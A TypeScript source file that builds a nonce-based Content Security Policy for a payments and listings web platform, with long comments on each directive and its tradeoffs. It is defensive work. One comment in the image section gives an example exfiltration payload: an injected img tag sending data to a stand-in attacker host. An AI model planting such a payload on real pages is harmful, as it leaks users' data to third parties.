import { callMediaOrigins } from "../calls/media-origins";
import { SUPABASE_URL } from "../supabase/env";

/**
 * The Content Security Policy.
 *
 * This was the largest outstanding security item on a platform that takes card
 * details, and the reason it stayed outstanding is written in KNOWN_GAPS: it
 * "needs a nonce strategy compatible with Next streaming". That turned out to
 * be the easy half. The hard half was deciding what it costs, and the answer
 * was measured rather than guessed: the production build renders 2 static
 * routes against 92 dynamic ones, so the usual objection to a per-request
 * nonce, that reading a header opts every page out of static rendering, is
 * worth almost nothing here. Ninety-two of ninety-four pages were already
 * dynamic because they read a session.
 *
 * What a CSP buys on THIS platform specifically: the checkout hands a guest to
 * Paystack and the wallet moves real money, so the attack that matters is a
 * script that should not be running reading a form or rewriting a destination.
 * `script-src` with a nonce and `strict-dynamic` means a script runs only if
 * this server minted it for this request, or was loaded by one that was. An
 * injected `<script>` in a listing description, a review, a support message or
 * an agent's own listing title carries no nonce and does not execute.
 *
 * ## It shipped report-only, and it now enforces by default
 *
 * A CSP that is wrong does not degrade, it deletes: a missed directive means a
 * blank page or a dead checkout, and the report was the only way to find the
 * ones nobody predicted. So this shipped as `Content-Security-Policy-Report-Only`
 * behind `CSP_ENFORCE === "true"`, which nobody ever set.
 *
 * That is the failure mode of a report-only policy nobody flips: it looks like
 * a control on every audit, in every header dump and in every screenshot, and
 * it has never blocked a single thing. A report-only policy is documentation.
 * The default is now the other way round, so a deployment that sets nothing
 * gets the protection, and turning it back off is a deliberate act somebody has
 * to write down.
 *
 * What was checked before flipping, rather than assumed, because the cost of
 * being wrong here is a white screen:
 *
 *  - Every inline script the app writes is nonced. Two in `app/layout.tsx`
 *    (theme, save-data) and the JSON-LD block on the listing page, plus every
 *    inline script Next itself emits for hydration and streaming. Counted in
 *    the browser, on a production build, in `tests/csp.spec.mjs`.
 *  - No route emits a `<style>` element, so `style-src-elem` can stay at
 *    `'self'` and only the `style=` attribute needs the inline allowance.
 *  - Nothing frames us and we frame nothing, so both frame directives are
 *    `'none'`.
 *  - The only cross-origin subresources are Unsplash stock, Google avatars
 *    and Supabase storage, all of them images, and the map's vector tiles,
 *    style, fonts and sprite from OpenFreeMap, which are fetched and so sit
 *    in `connect-src`.
 *  - The only cross-origin NAVIGATION a form can reach is Paystack checkout.
 *    The Google and Apple sign-in rows that used to post to a server action
 *    ending in a redirect to Supabase authorize are gone from `AuthChoices`,
 *    so no provider origin belongs in `form-action`. If those rows ever come
 *    back, the Supabase origin has to come back with them or Chrome kills the
 *    sign in at the redirect: it applies `form-action` to the whole chain.
 *
 * There is no second policy to keep in step, because both modes serve the same
 * string, so a deployment that hits something unforeseen can set
 * `CSP_ENFORCE=false`, read the `[csp]` lines, and come back.
 */

/**
 * Enforcing unless somebody explicitly asks for reports instead.
 *
 * Fail closed. The old spelling was `=== "true"`, which meant an unset variable,
 * a typo, a missing entry in a new environment or a value of "TRUE" all landed
 * on report-only, and report-only is indistinguishable from no policy at all to
 * an attacker. Only the literal "false" steps back to reporting now, so the
 * accident cases all fail towards the protection.
 */
export function cspEnforced(): boolean {
  return process.env.CSP_ENFORCE !== "false";
}

export function cspHeaderName(): string {
  return cspEnforced() ? "Content-Security-Policy" : "Content-Security-Policy-Report-Only";
}

/** Where violations are posted. Same origin, so it needs nothing in connect-src. */
export const CSP_REPORT_PATH = "/api/csp-report";

/** The request header the root layout reads to nonce its two inline scripts. */
export const NONCE_HEADER = "x-nonce";

/**
 * A fresh nonce, 128 bits, base64.
 *
 * `crypto.getRandomValues` rather than `Math.random`, because a guessable nonce
 * is not a nonce: the whole guarantee is that an attacker who can inject markup
 * cannot predict the token that would make it run. Web Crypto is used rather
 * than `node:crypto` so this works unchanged if the middleware ever runs on the
 * edge runtime.
 */
export function createNonce(): string {
  const bytes = new Uint8Array(16);
  crypto.getRandomValues(bytes);
  return btoa(String.fromCharCode(...bytes));
}

/**
 * The Supabase origins the browser genuinely talks to, as CSP sources.
 *
 * Both schemes, because the client speaks REST and auth over https and realtime
 * over a websocket, and `connect-src` governs both. Derived from the public
 * project URL rather than hardcoded, so a project move follows the environment;
 * an absent or malformed URL yields nothing at all rather than a wildcard,
 * which keeps a keyless build's policy tighter than a configured one instead of
 * looser.
 */
function supabaseOrigins(): string[] {
  if (SUPABASE_URL.length === 0) return [];
  try {
    const { origin, host } = new URL(SUPABASE_URL);
    return [origin, `wss://${host}`];
  } catch {
    return [];
  }
}

/**
 * Every host this platform loads a picture from, as CSP sources.
 *
 * Kept in step with the `images.remotePatterns` allowlist in `next.config.ts`
 * by hand, because the two lists are read by different runtimes and there is
 * no shared module either of them can import. A host added there and forgotten
 * here shows a broken image; a host added here and forgotten there throws a
 * 500 out of the image optimiser. The second failure is louder, which is the
 * right way round.
 *
 * The Supabase storage origin is NOT in this list. It is added at call time
 * from `supabaseOrigins()`, so it follows the project URL rather than being
 * written down twice.
 */
const IMAGE_HOSTS: readonly string[] = [
  // Stock photography used by editorial surfaces.
  "https://images.unsplash.com",
  // The avatar a Google account already has. Google picks the shard, lh3
  // through lh6, so the wildcard is on the subdomain and nothing wider.
  "https://*.googleusercontent.com",
  // No map host. The map's provider, OpenFreeMap, is fetched rather than
  // drawn as an <img>, so its host is in MAP_DATA_ORIGINS below. CARTO's
  // host (non-commercial tiles) and MapTiler's (the paid path the founder
  // declined) were both removed on 9 November 2026 (see lib/maps/tiles).
];

/**
 * Where the map's data comes from, for `connect-src`.
 *
 * OpenFreeMap serves the vector tiles, the TileJSON that names them, the
 * style, the glyphs and the sprite, all from this one host, and every one of
 * them is FETCHED (by MapLibre and its worker, or by the lightweight canvas
 * painter), never put in an `<img>`. One named host, no wildcard. MapLibre's
 * worker is a same-origin file the bundler emits, which `worker-src 'self'`
 * already covers.
 */
const MAP_DATA_ORIGINS: readonly string[] = ["https://tiles.openfreemap.org"];

/**
 * Where a payment is allowed to take somebody.
 *
 * Read by `form-action` and by `PAYSTACK_FRAME_ORIGINS` below, and by nothing
 * else: no Paystack script runs in this app and no browser code calls their
 * API, so these origins are not in `script-src` or `connect-src` and must not
 * be added there without a reason written down beside them.
 */
const PAYSTACK_ORIGINS: readonly string[] = [
  "https://checkout.paystack.com",
  "https://checkout.paystack.co",
  "https://standard.paystack.co",
  "https://paystack.com",
];

/**
 * The origins the in-app checkout is allowed to put in an IFRAME.
 *
 * TWO of the four above, and the two that are left out are left out on
 * purpose. `standard.paystack.co` and `paystack.com` are hops in the redirect
 * chain a form POST follows, which is `form-action`'s business; neither is
 * ever loaded as a framed document, so neither belongs here. Framing is a
 * strictly larger grant than navigating, and the two lists are kept apart so
 * that widening one can never silently widen the other.
 *
 * WHY THIS IS NOT `'none'` ANY MORE. Paying used to leave our origin
 * entirely: `window.location.assign(authorization_url)` at eight call sites,
 * and the tab that was Vallo became the tab that was Paystack. Paystack's
 * Inline v2 shim resumes the very transaction we already initialise server
 * side and draws the checkout in one iframe on our own page instead, so the
 * person keeps our URL bar. `initializeTransaction` has always returned the
 * access code that shim needs. `'none'` is the single directive that forbids
 * it, so it is narrowed here rather than removed.
 *
 * WHAT THIS DOES NOT GRANT, said plainly because a money product holding KYC
 * documents does not get to carry an exception nobody can explain. It is two
 * named hosts and never a wildcard. `frame-ancestors 'none'` is untouched, so
 * the grant is one-directional: we may frame Paystack, nobody may frame us.
 * No card detail crosses our code either way; the PAN is typed into Paystack's
 * own document inside the frame, exactly as it was typed into Paystack's own
 * page before, so PCI scope is unchanged by this line.
 *
 * WHAT IS STILL UNPROVEN, recorded beside the grant rather than in a commit
 * message that scrolls away. Nobody has yet put a live test card through this
 * frame, and nobody has yet watched a Nigerian bank's 3-D Secure step decide
 * whether to render inside it or to open a window. The shim carries no
 * `window.open` and sets no `sandbox` attribute on the frame, which means
 * nothing structurally stops the framed document opening one. If a bank does
 * open a window, this directive is still correct and still narrow; it is the
 * checkout built on top of it that has to keep the hosted page reachable.
 */
const PAYSTACK_FRAME_ORIGINS: readonly string[] = [
  "https://checkout.paystack.com",
  "https://checkout.paystack.co",
];

/**
 * Dojah's hosted identity check (EasyOnboard), framed on /verification so a
 * person can take a selfie and confirm their NIN or BVN without leaving the
 * app. One named host. The camera is delegated to this origin alone by the
 * Permissions-Policy header in next.config.ts; nothing else may ask for it
 * from inside a frame.
 */
export const DOJAH_FRAME_ORIGINS: readonly string[] = ["https://identity.dojah.io"];

/**
 * The policy, for one request.
 *
 * Every directive below is either the strictest value that works or carries the
 * reason it cannot be.
 */
/**
 * `script-src`, which is one directive in production and a different one under
 * `next dev`, and the difference is worth the paragraphs below.
 *
 * WHAT SHIPS. `'strict-dynamic'` with a per-request nonce. Where it is
 * supported the browser ignores `'self'` and every host in the directive and
 * trusts only scripts carrying this request's nonce, plus whatever those
 * scripts load themselves. That last clause is what lets Next's chunk loader
 * keep working without listing a single file. `'self'` and `https:` stay for
 * browsers that do not implement strict-dynamic, where they are the fallback
 * rather than the rule.
 *
 * WHY DEVELOPMENT IS DIFFERENT, AND WHY IT COST US A DAY OF PROOFS. Under
 * `next dev` with Turbopack, the HMR runtime injects its own chunk tags after
 * hydration and they do not carry the request's nonce. With strict-dynamic in
 * force the browser refuses every one of them, so `/_next/static/chunks/*`
 * never loads, HYDRATION NEVER COMPLETES, and any effect that runs on mount
 * never runs at all.
 *
 * That is invisible if you are clicking around, because the server-rendered
 * HTML is already on screen. It is NOT invisible in a screenshot: this product
 * wraps every band below the fold in `Reveal`, which fades a block in from an
 * IntersectionObserver in an effect. No hydration, no observer, no reveal, so
 * a fullpage proof of a marketing page came back as the hero and then four and
 * a half thousand pixels of nothing. F2 measured it directly: 21 `.nf-reveal`
 * nodes, one shown, twenty at `opacity: 0`, and `window.scrollY` stuck at 0
 * after a scroll to 4,623. Every worker shooting a Reveal page was judging
 * their work from a picture of a page that had never finished loading.
 *
 * So in development the policy keeps the nonce and drops `'strict-dynamic'`,
 * which lets `'self'` do its job again and serve same-origin chunks, and adds
 * `'unsafe-eval'` because Turbopack's HMR needs it. BOTH ARE DEVELOPMENT ONLY.
 * `NODE_ENV` is `production` in the build that ships and `test` under vitest,
 * so neither reaches a deployed response, and the assertions in
 * `security.test.ts` and `tests/csp.spec.mjs` that forbid `'unsafe-eval'` and
 * `'unsafe-inline'` still run against the shipping directive and still pass.
 *
 * The alternative, loosening what ships, is the trade this comment exists to
 * refuse: a real policy is worth more than a convenient one, and a development
 * server is not a threat surface.
 *
 * ONE REFUSAL IS EXPECTED IN PRODUCTION AND IT IS NOT OURS. Measured on a
 * production server on 19 September 2026, `next build` then `next start`, on
 * every route walked including `/`: the browser refuses exactly one script,
 * `/_next/static/chunks/11-*.js`, because Next emits that one `<script src>`
 * with no nonce on it. It is not this policy and it is not the nonce wiring.
 * Next 16.2.12 builds the identical element in two places and passes
 * `nonce: ctx.nonce` in only one of them: `app-render/get-layer-assets.js`
 * stamps it, `app-render/create-component-styles-and-scripts.js` does not. The
 * second one is what attaches a boundary's entry chunks, `template`, `error`,
 * `loading`, `not-found`, `forbidden` and `unauthorized`, and the ROOT
 * boundaries sit above every route, which is why the refusal is on all of them
 * rather than on the app shell alone.
 *
 * Its cost was measured, not assumed, by serving one build twice, enforcing and
 * report-only, and comparing: identical DOM, identical element counts,
 * identical numbers of React-owned controls carrying live handlers, no page
 * errors either way. Every module inside that chunk is duplicated by Turbopack
 * into chunks that do carry the nonce and do load, and `'strict-dynamic'`
 * permits the runtime's own dynamically inserted chunk tags, which the map on
 * `/search?view=map` proves end to end: Leaflet is imported on demand and its
 * tiles arrive. So the refusal costs one redundant eager fetch and nothing
 * else, and NOTHING HERE SHOULD BE LOOSENED TO SILENCE IT.
 *
 * `tests/csp.spec.mjs` records it rather than excusing it: any other refusal,
 * an inline one, a cross-origin one, or a chunk that was nonced and refused
 * anyway, still fails the walk, and the tally at the end of that file is the
 * signal to delete the whole allowance the day Next stamps its own element.
 */
function scriptSrc(nonce: string): string[] {
  if (process.env.NODE_ENV === "development") {
    return ["'self'", "https:", `'nonce-${nonce}'`, "'unsafe-eval'"];
  }
  return ["'self'", "https:", `'nonce-${nonce}'`, "'strict-dynamic'"];
}

export function contentSecurityPolicy(nonce: string): string {
  const supabase = supabaseOrigins();

  const directives: [string, string[]][] = [
    // Everything not named below falls back to same origin only.
    ["default-src", ["'self'"]],

    // strict-dynamic with a per-request nonce, and one deliberate difference
    // under `next dev`. The whole reasoning is on `scriptSrc` above.
    ["script-src", scriptSrc(nonce)],

    /*
     * `'unsafe-inline'` for styles, honestly labelled rather than quietly
     * omitted. React writes every `style={{...}}` prop as an inline attribute,
     * so removing this breaks the rendering of most of the app. It is a far
     * smaller risk than the script equivalent: CSS injection can restyle a
     * page, it cannot read a card number or call an API.
     *
     * This directive is the FALLBACK now, not the rule. It stays as written
     * because a browser that does not implement `style-src-elem` reads this
     * one for everything, and on such a browser the choice is this allowance
     * or an unstyled product.
     */
    ["style-src", ["'self'", "'unsafe-inline'"]],

    /*
     * And the half of the allowance that can be taken back, taken back.
     *
     * `style-src` above covers two very different things. A `style=` attribute
     * on an element React rendered is unavoidable. A whole injected `<style>`
     * block is not, and it is the dangerous one: it can draw a fake sign-in
     * over the real page, hide the amount above a Pay button, or read the
     * document through attribute selectors on a nonce or a CSRF field.
     *
     * Splitting them costs nothing here because nothing needs the element
     * form. Measured on a production build rather than reasoned about: a
     * `<style>` count across seventeen routes, signed out, returned zero on
     * every one of them. Stylesheets arrive as `<link>` elements, which this
     * directive also governs and which are same origin.
     *
     * A browser that understands this directive stops honouring
     * `'unsafe-inline'` for elements and keeps honouring it for attributes,
     * which is exactly the split we want. One that does not understand it
     * falls back to `style-src` and is no worse off than before.
     */
    /*
     * THE DEVELOPMENT BRANCH STAYS, and the paragraph above is about what
     * SHIPS. The measurement it quotes, zero `<style>` elements across
     * seventeen routes, was taken on a PRODUCTION build, and it is still true
     * there. Under `next dev` it is false: Turbopack replaces a stylesheet on
     * every hot update by injecting a `<style>` element, and this directive
     * with `'self'` alone refuses one, because `'self'` governs where a file
     * may come from and says nothing about inline content.
     *
     * The consequence is the fault this whole file has produced three times
     * today in different clothes: a page that renders, looks broken, and
     * explains nothing. An unstyled dev page is indistinguishable from a
     * stylesheet somebody has just broken, so it costs a developer an hour and
     * then costs the next one another.
     *
     * `NODE_ENV` is `production` in the build that ships and `test` under
     * vitest, so this allowance reaches no deployed response, and the
     * assertions that forbid `'unsafe-inline'` still run against the shipping
     * directive. Somebody reverted this line to the shipping form while this
     * was being written, which is the reading the paragraph above invites;
     * the paragraph now says which build it measured.
     */
    ["style-src-elem", process.env.NODE_ENV === "development" ? ["'self'", "'unsafe-inline'"] : ["'self'"]],

    /*
     * Images used to be `https:`, a wildcard over every host on the web, and
     * exactly one thing justified it: LiteAPI served each partner hotel's
     * photos from whichever CDN that supplier happened to use, so the host set
     * was genuinely unknowable at build time.
     *
     * There are no partner photos any more. Every image on this platform now
     * comes from a host we can name, so the wildcard is closed and the list is
     * the real one. It is the same set `next.config.ts` allows `next/image` to
     * optimise. The map draws no `<img>` from a third party: its data is
     * fetched, under `connect-src`.
     *
     * A photo that fails to load is a grey tile. A wildcard that stays open
     * because nobody revisited it is an exfiltration channel: an injected
     * `<img src="https://attacker/?=...">` is a GET to anywhere, carrying
     * whatever the URL was built from.
     */
    ["img-src", ["'self'", "data:", "blob:", ...IMAGE_HOSTS, ...supabase]],

    /*
     * Walkthrough video, from the same places a photo comes from.
     *
     * Without this directive `media-src` falls back to `default-src 'self'`,
     * and the walkthrough player is the one surface where that is about to
     * matter: `listing_videos` is already joined into the listing detail read
     * and its rows point at Supabase storage. The day somebody renders the
     * `<video>` element, an enforcing policy would show a black box with no
     * server-side trace, and the CSP would be suspected last.
     *
     * Named now, while the cost of naming it is nothing: these are the same
     * origins `img-src` already trusts, for the same buckets, and no host is
     * added that a listing photo could not already come from. `blob:` is here
     * for the same reason it is in `img-src`, a chosen file previewed before
     * it is uploaded.
     */
    ["media-src", ["'self'", "blob:", ...supabase]],

    // Self-hosted faces only, and `data:` for nothing. See public/fonts.
    ["font-src", ["'self'"]],

    // The browser talks to us, to Supabase, to the map's data host
    // (OpenFreeMap, MAP_DATA_ORIGINS above) and, on a call screen, to the
    // media provider's signalling host (VC1, `lib/calls/media-origins.ts`;
    // nothing is added while LIVEKIT_URL is unset). Every payment call is
    // server side, so Paystack does not belong here: if a browser ever
    // starts calling an API directly, this directive is what reports it.
    ["connect-src", ["'self'", ...supabase, ...MAP_DATA_ORIGINS, ...callMediaOrigins(process.env.LIVEKIT_URL)]],

    // No plugins, no applets, ever.
    ["object-src", ["'none'"]],

    // Nothing may frame us, which is X-Frame-Options said in the modern
    // spelling. Both are sent: the old header for browsers that only read it.
    ["frame-ancestors", ["'none'"]],

    // The in-app checkout's iframe, and nothing else in the world. Two named
    // Paystack checkout hosts, never a wildcard, and the full reason is
    // written beside PAYSTACK_FRAME_ORIGINS above.
    ["frame-src", [...PAYSTACK_FRAME_ORIGINS, ...DOJAH_FRAME_ORIGINS]],

    // A `<base>` tag rewrite turns every relative URL on the page into an
    // attacker's, which is why this is pinned even though nothing sets one.
    ["base-uri", ["'self'"]],

    /*
     * `'self'` alone here was a live bug waiting on one environment variable.
     *
     * The old note said Paystack is reached by NAVIGATION to an
     * authorization_url rather than by a cross-origin form post, so
     * `form-action 'self'` could not affect the checkout. That is half right
     * and the wrong half is the one that breaks wallet funding. The deposit
     * flow submits a form to our own route, and that route answers with a
     * redirect to Paystack. Chrome applies `form-action` to the ENTIRE
     * redirect chain a form submission follows, not only to its first hop, so
     * a same-origin POST that redirects off site is blocked by `'self'` just
     * as a cross-origin POST would be. Firefox does not do this, which is
     * exactly how a bug like this reaches production: it works on the machine
     * of whoever tested it.
     *
     * Nothing is wrong today only because `CSP_ENFORCE` is unset and the
     * policy is report-only. The day it is set to "true", every deposit dies
     * at the redirect with a console error and no server-side trace. So the
     * Paystack origins are named now, while the cost of being wrong is a
     * report rather than a dead checkout.
     *
     * Both TLDs are listed because Paystack has used both: older integrations
     * are redirected to `checkout.paystack.com` and newer ones to
     * `checkout.paystack.co`, the choice is made by their API rather than by
     * us, and an authorization_url is opaque to this codebase.
     */
    ["form-action", ["'self'", ...PAYSTACK_ORIGINS]],

    // A service worker is registered (public/sw.js), and it may be created
    // from a blob by the framework's own loader. MapLibre's tile worker is a
    // same-origin static file (`lib/maps/gl-layer.ts`), so 'self' covers it;
    // were the assets ever served from another origin, MapLibre would start
    // it from a blob, which is already here.
    ["worker-src", ["'self'", "blob:"]],
    ["manifest-src", ["'self'"]],
  ];

  const policy = directives
    .map(([name, values]) => `${name} ${values.join(" ")}`)
    .join("; ");

  /*
   * `report-uri` is deprecated and `report-to` is its replacement, and both are
   * sent because neither is universally supported: Firefox still reads only the
   * deprecated one and some Chromium versions want the Reporting-Endpoints
   * header that `report-to` refers to. Sending both means the reports arrive
   * whatever the reader is using, which matters most in exactly the phase this
   * policy is in, where the reports ARE the deliverable.
   */
  return `${policy}; report-uri ${CSP_REPORT_PATH}; report-to csp`;
}

/** The header that gives `report-to csp` above somewhere to point. */
export const REPORTING_ENDPOINTS = `csp="${CSP_REPORT_PATH}"`;
